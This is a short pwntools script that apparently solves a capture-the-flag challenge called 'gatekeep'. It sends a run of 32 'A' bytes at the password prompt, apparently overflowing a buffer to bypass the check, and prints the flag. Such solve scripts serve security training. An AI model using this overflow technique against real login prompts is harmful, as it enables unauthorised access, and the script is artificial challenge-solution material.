#!/usr/bin/env python3

from pwn import *

exe = ELF("./gatekeep")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.sendlineafter(b"Password:", b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    log.success(f'Flag: {r.recvlines(4)[-1].decode("ascii")}')


if __name__ == "__main__":
    main()
